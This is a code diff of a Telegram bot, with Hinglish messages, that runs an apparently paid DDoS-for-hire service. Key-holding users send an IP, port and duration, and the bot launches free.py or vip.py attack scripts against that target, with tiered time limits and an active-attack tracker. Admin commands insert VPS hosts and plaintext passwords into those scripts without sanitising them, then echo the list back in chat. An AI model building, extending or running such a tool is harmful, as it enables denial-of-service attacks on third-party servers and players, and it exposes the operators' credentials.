@@ -346,7 +346,7 @@ def redeem_key(message):
     bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
 
 # ✅ /attack Command (Attack Start + Finish Message)  
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['attack'])
 def handle_attack(message):
     user_id = str(message.from_user.id)
 
@@ -363,6 +363,49 @@ def handle_attack(message):
     # ✅ सही कमांड फॉर्मेट चेक करें  
     command = message.text.split()
     if len(command) != 4:
+        bot.reply_to(message, "⚠ **USAGE:** /attack <IP> <PORT> <TIME>")
+        return
+
+    target, port, time_duration = command[1], command[2], command[3]
+
+    try:
+        port = int(port)
+        time_duration = int(time_duration)
+    except ValueError:
+        bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
+        return
+
+    if time_duration > 100:
+        bot.reply_to(message, "🚫 **FREE ATTACK TIME 100 SECONDS HAI!**")
+        return
+
+    # ✅ Multivps.py को सही से रन करें  
+    try:
+        subprocess.Popen(["python3", "free.py", target, str(port), str(time_duration)])
+        bot.reply_to(message, f"🚀 **Attack Started! /stats **\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")
+
+        # ✅ Attack Finish Message भेजने के लिए Timer सेट करें  
+        def send_attack_finished():
+            time.sleep(time_duration)
+            bot.send_message(message.chat.id, f"✅ **Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")
+
+        threading.Thread(target=send_attack_finished, daemon=True).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
+
+#  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
+@bot.message_handler(commands=['bgmi'])
+def handle_vip_attack(message):
+    user_id = str(message.from_user.id)
+
+    # ✅ पहले चेक करें कि यूज़र ने Key रिडीम की है और VIP है या नहीं  
+    if not is_user_vip(user_id):
+        bot.reply_to(message, "❌ **PEHLE VIP KEY REDEEM KARO, TABHI ATTACK KAR SAKTE HO!**")
+        return
+
+    command = message.text.split()
+    if len(command) != 4:
         bot.reply_to(message, "⚠ **USAGE:** /bgmi <IP> <PORT> <TIME>")
         return
 
@@ -375,48 +418,54 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
         return
 
-    if time_duration > 300:
-        bot.reply_to(message, "🚫 **MAX ATTACK TIME 300 SECONDS HAI!**")
+    if time_duration > 240:
+        bot.reply_to(message, "🚫 **VIP USERS KE LIYE MAX ATTACK TIME 240 SECONDS HAI!**")
         return
 
     # ✅ Multivps.py को सही से रन करें  
     try:
-        subprocess.Popen(["python3", "multivps.py", target, str(port), str(time_duration)])
-        bot.reply_to(message, f"🚀 **Attack Started!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")
+        subprocess.Popen(["python3", "vip.py", target, str(port), str(time_duration)])
+        bot.reply_to(message, f"🔥 **VIP Attack Started! /stats **\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")
 
-        # ✅ Attack Finish Message भेजने के लिए Timer सेट करें  
+        attack_end_time = time.time() + time_duration
+        if user_id not in active_attacks:
+            active_attacks[user_id] = []
+        active_attacks[user_id].append((target, port, attack_end_time))
+
         def send_attack_finished():
             time.sleep(time_duration)
-            bot.send_message(message.chat.id, f"✅ **Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")
+            bot.send_message(message.chat.id, f"✅ **VIP Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")
 
         threading.Thread(target=send_attack_finished, daemon=True).start()
 
     except Exception as e:
-        bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
+        bot.reply_to(message, f"❌ **VIP Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
 
-# ✅ /STATS Command - Shows Only Active Attacks
-# ✅ /STATS Command - Shows Only Active Attacks
+
+# ✅ `/stats` Command  
 @bot.message_handler(commands=['stats'])
 def attack_stats(message):
-    if not active_attacks:  # ✅ INDENTATION FIXED
-        bot.reply_to(message, "📊 No Active Attacks Right Now!")
-        return  # ✅ यह लाइन सही से इंडेंट होनी चाहिए
+    now = time.time()
+    updated_attacks = {}
 
-    now = datetime.datetime.now(IST)
-
-    # ✅ खत्म हुए अटैक हटाओ
-    for user_id in list(active_attacks.keys()):
-        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[2] > now]
-        if not active_attacks[user_id]:  
-            del active_attacks[user_id]
-
-    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
-
+    # ✅ खत्म हो चुके अटैक्स हटाएँ  
     for user_id, attacks in active_attacks.items():
+        active_attacks[user_id] = [attack for attack in attacks if attack[2] > now]
+        if active_attacks[user_id]:  
+            updated_attacks[user_id] = active_attacks[user_id]
+
+    # ✅ अगर कोई एक्टिव अटैक नहीं बचा तो मैसेज भेजें  
+    if not updated_attacks:
+        bot.reply_to(message, "📊 **No Active Attacks Right Now!**")
+        return
+
+    # ✅ एक्टिव अटैक्स का Status तैयार करें  
+    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
+    for user_id, attacks in updated_attacks.items():
         stats_message += f"👤 **User ID:** `{user_id}`\n"
         for target, port, end_time in attacks:
-            remaining_time = (end_time - now).total_seconds()
-            stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"
+            remaining_time = int(end_time - now)
+            stats_message += f"🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Ends In:** `{remaining_time}s`\n\n"
 
     bot.reply_to(message, stats_message, parse_mode="Markdown")
 
@@ -431,7 +480,7 @@ def my_info(message):
 
     # ✅ अगर यूजर की Key एक्सपायर हो चुकी है
     if not is_user_allowed(user_id):
-        bot.reply_to(message, "⏳ **PEHLE KEY BIY KR! PLEASE REDEEM A KEY.**")
+        bot.reply_to(message, "⏳ **PEHLE KEY BUY KR! PLEASE REDEEM A KEY.**")
         return  # ✅ FIX: यहाँ से फंक्शन को रोक देना चाहिए
 
     is_admin = "✅ YES" if user_id in ADMINS else "❌ NO"
@@ -484,6 +533,91 @@ def announce_message(message):
     threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()
 
     bot.reply_to(message, "✅ ANNOUNCEMENT SENT & PINNED!")
+
+# add vps
+@bot.message_handler(commands=['addvps'])
+def add_vps(message):
+    if str(message.from_user.id) not in ADMINS:
+        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
+        return
+
+    command = message.text.split()
+    if len(command) != 4:
+        bot.reply_to(message, "⚠ USAGE: /addvps <IP> <USERNAME> <PASSWORD>")
+        return
+
+    ip, user, password = command[1], command[2], command[3]
+
+    # VPS को free.py और vip.py में ऐड करें
+    for filename in ["free.py", "vip.py"]:
+        with open(filename, "r") as file:
+            lines = file.readlines()
+
+        # VPS लिस्ट खोजें और नया VPS जोड़ें
+        for i, line in enumerate(lines):
+            if "VPS_LIST = [" in line:
+                lines.insert(i + 1, f'    {{"host": "{ip}", "user": "{user}", "password": "{password}"}},\n')
+                break
+
+        # फाइल को अपडेट करें
+        with open(filename, "w") as file:
+            file.writelines(lines)
+
+    bot.reply_to(message, f"✅ NEW VPS ADDED!\n🌐 **IP:** `{ip}`\n👤 **User:** `{user}`", parse_mode="Markdown")
+
+# /remove vps
+@bot.message_handler(commands=['removevps'])
+def remove_vps(message):
+    if str(message.from_user.id) not in ADMINS:
+        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
+        return
+
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "⚠ USAGE: /removevps <IP>")
+        return
+
+    ip_to_remove = command[1]
+    removed = False
+
+    for filename in ["free.py", "vip.py"]:
+        with open(filename, "r") as file:
+            lines = file.readlines()
+
+        new_lines = [line for line in lines if f'"host": "{ip_to_remove}"' not in line]
+
+        if len(new_lines) < len(lines):
+            with open(filename, "w") as file:
+                file.writelines(new_lines)
+            removed = True
+
+    if removed:
+        bot.reply_to(message, f"✅ VPS `{ip_to_remove}` REMOVED SUCCESSFULLY!")
+    else:
+        bot.reply_to(message, f"❌ VPS `{ip_to_remove}` NOT FOUND!")
+
+# checkvps
+@bot.message_handler(commands=['checkvps'])
+def check_vps(message):
+    if str(message.from_user.id) not in ADMINS:
+        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
+        return
+
+    vps_list = []
+
+    for filename in ["free.py", "vip.py"]:
+        with open(filename, "r") as file:
+            lines = file.readlines()
+
+        for line in lines:
+            if '"host":' in line:
+                vps_list.append(line.strip())
+
+    if vps_list:
+        vps_info = "\n".join(vps_list)
+        bot.reply_to(message, f"🔍 **ACTIVE VPS LIST:**\n```\n{vps_info}\n```", parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "❌ NO VPS FOUND!")
 
 # ✅ /CHECK Command (List Active Keys)
 @bot.message_handler(commands=['check'])
